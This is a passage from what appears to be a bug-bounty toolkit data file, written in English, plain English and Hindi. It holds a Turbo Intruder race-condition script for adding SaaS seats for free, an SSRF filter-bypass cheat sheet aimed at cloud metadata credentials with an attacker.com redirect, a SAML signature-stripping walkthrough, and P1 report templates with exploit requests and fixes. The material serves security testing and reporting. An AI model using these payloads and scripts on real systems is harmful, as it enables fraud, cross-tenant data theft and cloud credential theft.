    "   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "   X-Tenant-Id: 11111111-aaaa-bbbb-cccc-111111111111",
    "3. Set Filter: Only in-scope requests, URL contains '/api/' or '/v1/'.",
    "4. Ignore static files: .css, .js, .png, .svg, .woff2.",
    "5. Check 'Check unauthenticated request' to detect unauthenticated BOLA.",
    "6. Click 'Autorize is off' to turn it ON.",
    "7. Browse Tenant B (Victim) with your browser as Admin.",
    "8. Look for rows marked with RED/ORANGE: 'Bypassed!' -> Immediate P1 finding!"
  ]
}`,
    howToUse: {
      en: "Keep Autorize running in the background while you thoroughly explore the target SaaS as an admin of Company B. Autorize automatically duplicates every request substituting Company A's headers.",
      simple: "Turn it on, click around as Company B, and look for red alerts indicating Company A could access the same secret page.",
      hi: "इसे ऑन करके कंपनी B में क्लिक करते रहें। जैसे ही कोई रेड या ऑरेंज 'Bypassed!' रो दिखे, वो सीधा P1 IDOR बग है।",
    },
  },
  {
    id: "turbo-intruder-seat-race",
    title: {
      en: "Turbo Intruder HTTP/2 Single-Packet Attack: Unlimited SaaS Seats",
      simple: "Turbo Intruder Script to Race-Condition SaaS Team Invitations",
      hi: "SaaS सीट लिमिट बाईपास करने के लिए Turbo Intruder HTTP/2 स्क्रिप्ट",
    },
    description: {
      en: "High-concurrency Python script for Turbo Intruder that bundles 30 invitation acceptance requests into a single TCP packet over HTTP/2, bypassing license seat validation.",
      simple: "Script that fires 30 requests at the exact same microsecond to add extra team members for free.",
      hi: "HTTP/2 सिंगल-पैकेट तकनीक से एक साथ 30 इनवाइट एक्सेप्ट भेजकर प्लान लिमिट को बाईपास करने वाली स्क्रिप्ट।",
    },
    category: "race_condition",
    language: "python",
    code: `def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2  # HTTP/2 single-packet attack
                           )

    # Base invitation accept request for target SaaS
    req = '''POST /api/v1/invitations/accept HTTP/2
Host: app.saasplatform.com
Authorization: Bearer <NEW_USER_TOKEN>
Content-Type: application/json

{"invite_token": "inv_shared_alpha_992"}'''

    # Queue 30 parallel requests in a single synchronized gate
    for i in range(30):
        engine.queue(req, gate='race_gate')

    # Release all 30 requests simultaneously
    engine.openGate('race_gate')

def handleResponse(req, interesting):
    table.add(req)
    # Check if multiple requests succeeded with 200 OK
    if req.status == 200:
        print("[+] Succeeded in adding member! Status: 200")`,
    howToUse: {
      en: "Right-click the invitation acceptance request in Burp Suite -> Send to Turbo Intruder -> Paste this script -> Click 'Attack'. Review how many requests returned 200 OK beyond the organization's seat limit.",
      simple: "Send the invitation accept request to Turbo Intruder, paste this script, and run it to test if you can add more members than allowed.",
      hi: "Burp में इनविटेशन एक्सेप्ट रिक्वेस्ट पर राइट क्लिक करके Turbo Intruder में भेजें, यह कोड पेस्ट करें और रन करें।",
    },
  },
  {
    id: "ssrf-cloud-metadata-cheatsheet",
    title: {
      en: "SaaS Webhook SSRF Cloud Metadata Bypass Cheat Sheet",
      simple: "Payloads to Bypass Filters and Steal AWS/GCP/K8s Cloud Keys",
      hi: "AWS, GCP और कुबेरनेट्स मेटाडेटा चुराने के लिए SSRF बाईपास पेलोड्स",
    },
    description: {
      en: "Battle-tested SSRF payloads designed to evade URL validators, private IP filters, and DNS checks in outbound webhooks and PDF converters.",
      simple: "A list of special URLs to paste into webhook test fields to bypass filters and extract cloud passwords.",
      hi: "वेबहुक और PDF जनरेटर्स में इस्तेमाल होने वाले SSRF बाईपास पेलोड्स की कम्पलीट चीट शीट।",
    },
    category: "ssrf",
    language: "bash",
    code: `# 1. AWS IMDSv1 Direct & Encodings:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://2852039166/latest/meta-data/                    # Decimal IP
http://0xa9fea9fe/latest/meta-data/                    # Hex IP
http://0251.0376.0251.0376/latest/meta-data/           # Octal IP
http://[::ffff:169.254.169.254]/latest/meta-data/      # IPv6 dual-stack
http://169.254.169.254.nip.io/latest/meta-data/        # Wildcard DNS

# 2. Google Cloud Platform (GCP) Metadata (Requires Metadata-Flavor header or legacy v1beta1):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token

# 3. Azure Instance Metadata Service:
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 4. Kubernetes In-Cluster APIs & Secrets:
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
file:///var/run/secrets/kubernetes.io/serviceaccount/token

# 5. Open Redirect to Bypass Strict IP Validators:
# Host a 302 redirect on your server: https://attacker.com/redirect.php
# <?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>`,
    howToUse: {
      en: "Test these payloads in any webhook URL, avatar from URL, integration settings, or PDF generator. If direct IPs are blocked, use the 302 Open Redirect method or decimal IP notation.",
      simple: "Paste these into any feature that asks for a URL. If the regular IP is blocked, try the decimal or hex version.",
      hi: "जहाँ भी URL डालने का ऑप्शन हो, वहाँ ये पेलोड्स डालकर टेस्ट करें। अगर सीधा IP ब्लॉक हो, तो डेसीमल या 302 रीडायरेक्ट का उपयोग करें।",
    },
  },
  {
    id: "saml-assertion-tamper",
    title: {
      en: "SAML Response Tampering & Signature Stripping PoC",
      simple: "How to Modify SAML Responses to Impersonate Any Admin",
      hi: "SAML रिस्पॉन्स में बदलाव करके एडमिन बनने की PoC गाइड",
    },
    description: {
      en: "Methodology for capturing, decoding, and modifying SAML assertions to bypass signatures and escalate to SuperAdmin roles.",
      simple: "Steps to decode the SAML login token, change your email to the CEO's email, and test if the server accepts it.",
      hi: "SAML लॉगिन टोकन को डिकोड करके उसमें ईमेल या रोल बदलने की पूरी प्रक्रिया।",
    },
    category: "saml_sso",
    language: "bash",
    code: `# 1. Intercept the SAMLResponse POST request in Burp Suite:
# POST /sso/saml/consume HTTP/1.1
# Host: target.saasapp.com
# SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5z...

# 2. Decode the Base64 parameter:
echo "PHNhbWxwOlJlc3BvbnNl..." | base64 -d > assertion.xml

# 3. Look for the NameID and Role Attributes in assertion.xml:
# <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
#   attacker@attacker.com
# </saml:NameID>
# <saml:Attribute Name="Role">
#   <saml:AttributeValue>Member</saml:AttributeValue>
# </saml:Attribute>

# 4. Modify the values to the victim:
# <saml:NameID>admin@targetcorp.com</saml:NameID>
# <saml:AttributeValue>SuperAdmin</saml:AttributeValue>

# 5. Test Signature Stripping:
# Delete the entire <ds:Signature>...</ds:Signature> block.
# Re-encode in Base64:
cat assertion.xml | base64 | tr -d '\n'

# 6. Send modified SAMLResponse in Burp Repeater.
# If accepted without signature verification -> Critical P1 Authentication Bypass!`,
    howToUse: {
      en: "Use this workflow whenever testing SAML Single Sign-On implementations. Use the SAML Raider Burp plugin for automated XML Signature Wrapping (XSW) attacks.",
      simple: "Use this test when checking company SSO logins to see if the server really checks cryptographic signatures.",
      hi: "SAML SSO टेस्ट करते समय इसका उपयोग करें। अगर सिग्नेचर हटाने के बाद भी सर्वर लॉगिन मान लेता है, तो यह क्रिटिकल P1 बग है।",
    },
  },
];

// ─── 4. HACKERONE / BUGCROWD P1 REPORT TEMPLATES ──────────────────────────────
export const SAAS_REPORT_TEMPLATES: SaaSReportTemplate[] = [
  {
    id: "p1-saas-cross-tenant-bola",
    title: {
      en: "Critical Multi-Tenant Isolation Failure: Cross-Tenant Data Access via BOLA/IDOR",
      simple: "P1 Report: Access Any Company's Data by Swapping Workspace ID",
      hi: "P1 रिपोर्ट: क्रॉस-टेनेंट BOLA/IDOR के ज़रिये किसी भी कंपनी का डेटा डाउनलोड करना",
    },
    vulnType: "Broken Object Level Authorization (BOLA / IDOR)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
    severity: "critical",
    reportMarkdown: `## Summary
A Critical Multi-Tenancy Isolation failure (BOLA / IDOR) was identified in the workspace management API. An authenticated user belonging to Organization A can view, export, and delete confidential project documents, customer databases, and audit logs belonging to any competing Organization B by simply substituting the \`workspace_id\` parameter in API requests.

The backend service validates that the requesting user has a valid active session, but fails to enforce tenant boundary checks ensuring that the requested \`workspace_id\` belongs to the user's organization context.

## Vulnerability Details
- **Vulnerable Endpoint**: \`GET /api/v2/workspaces/{workspace_id}/export\`
- **HTTP Method**: \`GET\` and \`DELETE\`
- **Affected Parameter**: \`workspace_id\` (URL Path)
- **CWE**: CWE-639: Authorization Bypass Through User-Controlled Key
- **CVSS 3.1 Score**: 9.6 (Critical)

## Steps to Reproduce
1. Log in to your first test organization **Tenant A (Attacker)**:
   - Account Email: \`attacker@security-research.com\`
   - Tenant A Workspace UUID: \`11111111-2222-3333-4444-555555555555\`
2. Log in to your second test organization **Tenant B (Victim)** in an incognito window:
   - Account Email: \`victim@security-research.com\`
   - Tenant B Workspace UUID: \`99999999-8888-7777-6666-000000000000\`
   - Create a confidential project named *"Confidential Enterprise Acquisition Strategy"*.
3. As **Tenant A**, send the following HTTP request using Burp Suite Repeater, substituting Tenant B's UUID in the path:

\`\`\`http
GET /api/v2/workspaces/99999999-8888-7777-6666-000000000000/export HTTP/1.1
Host: app.target-saas.com
Authorization: Bearer <TENANT_A_AUTH_TOKEN>
Accept: application/json
\`\`\`

4. Observe that the server responds with **HTTP/1.1 200 OK** containing the complete confidential project details, documents, and audit history of Tenant B.

## Proof of Concept (HTTP Response)
\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Disposition: attachment; filename="workspace_export.json"

{
  "workspace_id": "99999999-8888-7777-6666-000000000000",
  "organization": "Tenant B Enterprise Corp",
  "projects": [
    {
      "name": "Confidential Enterprise Acquisition Strategy",
      "files": ["financial_audit_2026.pdf", "customer_contracts.xlsx"],
      "created_by": "victim@security-research.com"
    }
  ]
}
\`\`\`

## Impact
This vulnerability breaks the fundamental multi-tenancy promise of the SaaS architecture. An attacker can systematically enumerate and scrape all customer records, confidential business plans, and intellectual property across every enterprise on the platform, leading to severe GDPR and SOC2 compliance violations.

## Remediation & Fix Recommendation
1. Implement mandatory tenant context validation in the API authorization middleware:
   \`\`\`python
   # Verify current session tenant matches requested workspace
   if current_user.tenant_id != requested_workspace.tenant_id:
       raise PermissionDenied("Access Denied: Tenant Isolation Violation")
   \`\`\`
2. Enforce database-level multi-tenancy filtering (e.g. Row-Level Security in PostgreSQL or automatic ORM global scopes: \`WHERE tenant_id = current_tenant\`).`,
  },
  {
    id: "p1-saas-webhook-ssrf-imds",
    title: {
      en: "Critical Server-Side Request Forgery (SSRF) via Webhook Test Feature Leaking AWS IAM Credentials",
      simple: "P1 Report: SSRF in Webhook Feature Stolen AWS IAM Cloud Keys",
      hi: "P1 रिपोर्ट: वेबहुक फ़ीचर में SSRF के ज़रिये AWS IAM क्लाउड कीज़ की चोरी",
    },
    vulnType: "Server-Side Request Forgery (Full SSRF)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
    severity: "critical",
    reportMarkdown: `## Summary
A Critical Server-Side Request Forgery (SSRF) vulnerability was identified in the Outbound Webhooks integration feature. An attacker can configure a webhook pointing to the internal AWS EC2 Instance Metadata Service (\`http://169.254.169.254\`) and trigger the 'Send Test Webhook' functionality. The backend server queries the internal metadata service and reflects the full HTTP response body back to the user, exposing live AWS IAM Temporary Credentials.

## Vulnerability Details
- **Vulnerable Feature**: Integrations -> Webhooks -> Test Webhook Endpoint
- **Vulnerable Endpoint**: \`POST /api/v1/integrations/webhooks/test\`
- **Affected Parameter**: \`target_url\` (JSON Body)
- **CWE**: CWE-918: Server-Side Request Forgery (SSRF)
- **CVSS 3.1 Score**: 9.8 (Critical)

## Steps to Reproduce
1. Log in to the application and navigate to **Workspace Settings -> Integrations -> Webhooks**.
2. Click **Add Webhook** or **Test Webhook**.
3. In the Webhook URL field, enter:
   \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`
4. Click **Send Test Event** and intercept the request in Burp Suite:

\`\`\`http
POST /api/v1/integrations/webhooks/test HTTP/1.1
Host: app.target-saas.com
Authorization: Bearer <RESEARCHER_USER_TOKEN>
Content-Type: application/json

{
  "target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "payload": {"event": "ping"}
}
\`\`\`

5. The server responds with the name of the IAM Role attached to the EC2 instance (e.g. \`production-saas-backend-worker\`).
6. Update the \`target_url\` to fetch the credentials for that role:
   \`http://169.254.169.254/latest/meta-data/iam/security-credentials/production-saas-backend-worker\`
7. The server returns the active AWS AccessKeyId, SecretAccessKey, and Session Token.

## Proof of Concept (HTTP Response with Redacted Keys)
\`\`\`http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "test_status": "SUCCESS",
  "http_status": 200,
  "response_body": {
    "Code": "Success",
    "LastUpdated": "2026-10-22T08:14:22Z",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIAQXXXXXXXXXXXXXXX",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token": "IQoJb3JpZ2luX2VjE...",
    "Expiration": "2026-10-22T14:45:00Z"
  }
}
\`\`\`

## Impact
Using the stolen AWS IAM credentials, an attacker can authenticate to the target's AWS cloud environment, read/write private S3 customer storage buckets, access RDS databases, and pivot through internal VPC microservices, leading to total cloud infrastructure compromise.

## Remediation & Fix Recommendation
1. **Network Layer Isolation**: Implement strict egress filtering on webhook worker servers. Deny outbound requests to private RFC 1918 IP addresses (\`10.0.0.0/8\`, \`172.16.0.0/12\`, \`192.168.0.0/16\`) and link-local addresses (\`169.254.0.0/16\`).
2. **Enforce AWS IMDSv2**: Require session-oriented token authentication (\`HttpTokens=required\`) with hop-limit set to 1 (\`HttpPutResponseHopLimit=1\`).
3. **Dedicated Egress Proxy**: Route all user-supplied outbound webhook requests through a dedicated hardened forward proxy (e.g. Smokescreen or Squid) that blocks internal IP resolutions.`,
  },
  {
    id: "p1-saas-pre-auth-account-takeover",
    title: {
      en: "Critical Pre-Account Takeover via Unverified Email Registration Before Corporate SSO Enforcement",
      simple: "P1 Report: Pre-Account Takeover via Unverified Email and SSO Merge",
      hi: "P1 रिपोर्ट: अनवेरिफाइड ईमेल और कॉर्पोरेट SSO के ज़रिये अकाउंट टेकओवर",
    },
    vulnType: "Authentication Bypass / Account Takeover",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    severity: "critical",
    reportMarkdown: `## Summary
A Critical Pre-Account Takeover vulnerability was discovered in the authentication lifecycle. When a user registers a standard username/password account with an email address belonging to an enterprise domain (e.g. \`victim@enterprise.com\`), the application does not require email confirmation before allowing account use. When the enterprise subsequently provisions SAML SSO for their domain, the existing password account is automatically merged with the SSO identity. The attacker retains valid password-based access to the victim's corporate account, bypassing corporate MFA and SSO access revocations.

## Vulnerability Details
- **Affected Flow**: Registration -> Enterprise SSO Activation -> Account Merging
- **CWE**: CWE-287: Improper Authentication
- **CVSS 3.1 Score**: 9.1 (Critical)

## Steps to Reproduce
1. Attacker identifies a target enterprise that is currently onboarding or planning to onboard to the SaaS platform (e.g. \`targetcorp.com\`).
2. Attacker goes to the public registration page (\`/signup\`) and registers an account using:
   - Email: \`ciso@targetcorp.com\`
   - Password: \`AttackerSecretPassword123!\`
3. The platform creates the account immediately in a functional state without enforcing email verification completion before login.
4. TargetCorp's IT team sets up Okta/Azure SAML SSO for the \`@targetcorp.com\` domain on the SaaS.
5. The CISO (\`ciso@targetcorp.com\`) logs in for the first time using their corporate Okta SSO.
6. The SaaS backend merges the Okta identity with the pre-existing password account.
7. The attacker opens an incognito window and logs in at \`/login\` using standard credentials:
   - Email: \`ciso@targetcorp.com\`
   - Password: \`AttackerSecretPassword123!\`
8. The attacker successfully authenticates and gains full access to TargetCorp's internal workspace.

## Impact
The attacker achieves permanent backdoor access to high-value enterprise accounts. Even if the enterprise removes the user from Okta or enforces strict corporate hardware 2FA, the attacker can continue logging in with their backdoor password directly through the SaaS public portal.

## Remediation & Fix Recommendation
1. Enforce strict mandatory email verification before activating any account or granting access to workspace data.
2. When an enterprise configures domain-wide SSO, invalidate all pre-existing password credentials associated with that email domain.
3. Require re-authentication with current password before allowing account linkage or merging between different identity providers.`,
  },
];
